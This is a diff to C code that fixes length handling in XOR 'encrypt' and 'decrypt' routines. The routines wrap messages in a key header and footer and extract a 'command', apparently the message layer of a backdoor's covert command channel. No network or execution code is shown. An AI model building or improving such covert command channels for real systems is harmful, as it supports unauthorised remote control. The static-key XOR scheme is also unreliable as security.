@@ -60,7 +60,7 @@ char *bd_encrypt(char *plaintext, int *msg_length){
     
     /* Encrypt */
     
-    printf("hash len: %d",strlen(hash));
+    printf("hash len: %zu",strlen(hash));
     xor_encrypt(hash, BD_ENCRYPT_KEY, strlen(hash));
     
     /* Prepend header key */
@@ -68,7 +68,7 @@ char *bd_encrypt(char *plaintext, int *msg_length){
     char *msg = malloc(BD_MAX_MSG_LEN);
     memset(msg, 0, BD_MAX_MSG_LEN);
     strcpy(msg, BD_KEY);
-    strncpy(msg + BD_KEY_LEN, hash, hash_len);
+    memcpy(msg + BD_KEY_LEN, hash, hash_len);
     
     printf("Message: %s\n", msg);
     
@@ -107,19 +107,18 @@ char *bd_decrypt(char *payload, int payload_len){
     int message_len = payload_len - BD_KEY_LEN;
     char message[BD_MAX_REPLY_LEN];
     memset(message, 0, BD_MAX_REPLY_LEN);
-    strncpy(message, payload + BD_KEY_LEN, message_len);
+    memcpy(message, payload + BD_KEY_LEN, message_len);
     printf("Message: %s\n", message);
     
     /* Decrypt message */
     
-    printf("message len: %d\n",strlen(message));
     printf("message actual len: %d\n", message_len);
     xor_encrypt(message, BD_ENCRYPT_KEY, message_len);
     
     /* Verify decryption succeeds by checking for header and footer */
     
     char *bd_header = message;
-    char *bd_footer = message + (strlen(message) - BD_KEY_LEN);
+    char *bd_footer = message + (message_len - BD_KEY_LEN);
     
     if(strncmp(bd_header, BD_HEADER, BD_KEY_LEN) != 0 || \
         strncmp(bd_footer, BD_FOOTER, BD_KEY_LEN) != 0 ){
@@ -134,9 +133,9 @@ char *bd_decrypt(char *payload, int payload_len){
     // Strip header and footer to get command
     char *bd_command = malloc(BD_MAX_REPLY_LEN);
     memset(bd_command, 0, BD_MAX_REPLY_LEN);
-    strncpy(bd_command, \
+    memcpy(bd_command, \
         (message + BD_KEY_LEN), \
-        strlen(message) - (2 * BD_KEY_LEN));
+        message_len - (2 * BD_KEY_LEN));
     if(strlen(bd_command) == 0){
         printf("Invalid command: %s\n", bd_command);
         return NULL;
